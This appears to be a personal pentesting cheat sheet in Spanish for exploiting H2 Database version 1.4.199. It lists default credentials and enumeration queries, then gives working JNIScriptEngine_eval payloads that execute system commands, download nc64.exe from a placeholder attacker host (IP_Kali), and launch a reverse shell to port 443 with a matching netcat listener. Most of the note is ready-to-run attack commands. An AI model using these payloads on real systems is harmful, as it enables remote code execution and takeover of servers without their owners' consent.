# H2 Databaase 

Tags: #H2 

**H2 Database** es una base de datos SQL embebida escrita en Java. Características:

- **Ligera y rápida** - Se ejecuta dentro de aplicaciones Java
- **Archivos típicos**: `.h2.db`, `.h2.sql`
- **Localización común**: `C:\Program Files\[app]\`, `C:\Users\[user]\AppData\`, `C:\ProgramData\`
- **Sin credenciales requeridas** generalmente (si está embebida)
- Credenciales: **sa:sa ó sa:**

![[Pasted image 20260825133926.png]]

## Comandos SQL
```bash 
# Mirar las tablas 
❯ SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES; 

# Mirar usuarios 
❯ SELECT * FROM INFORMATION_SCHEMA.USERS;
```

## H2 Versión 1.4.199 

* [JNI Code Execution](https://www.exploit-db.com/exploits/49384)

```bash 
❯ SELECT H2VERSION();   # Mirar la versión
❯ SELECT USER();        # Mirar los usuarios 
```

```bash 
Paso 1:
# Ejecutar el código que aparece en el exploit y darle a cada comando RUN

Paso 2:
# Ejecutar comandos 'whoami'
❯ CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("whoami").getInputStream()).useDelimiter("\\Z").next()');

# Hostname 
❯ CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("hostname").getInputStream()).useDelimiter("\Z").next()');

# PATH
❯ CALL JNIScriptEngine_eval('java.lang.System.getenv("PATH")');
```

```bash 
# Conocer la ruta del dir 'Temp'
❯ CALL JNIScriptEngine_eval('java.lang.System.getProperty("java.io.tmpdir")');

	C:\Users\tony\AppData\Local\Temp\

Paso 3:
# Subir un Netcat 
❯ CALL JNIScriptEngine_eval('java.nio.file.Files.copy(java.net.URI.create("http://IP_Kali/nc64.exe").toURL().openStream(),java.nio.file.Paths.get("C:/Users/tony/AppData/Local/Temp/nc64.exe"),java.nio.file.StandardCopyOption.REPLACE_EXISTING)');

# Comprobar que se subio el Netcat 
❯ CALL JNIScriptEngine_eval('new java.io.File("C:/Users/tony/AppData/Local/Temp/nc64.exe").exists()');

# Ejecutar la Revershell 
❯ CALL JNIScriptEngine_eval('java.lang.Runtime.getRuntime().exec("C:/Users/tony/AppData/Local/Temp/nc64.exe IP_Kali 443 -e cmd.exe")');
```

```bash 
❯ rlwrap nc -nlvp 443   # Recibir la revershell en Kali
```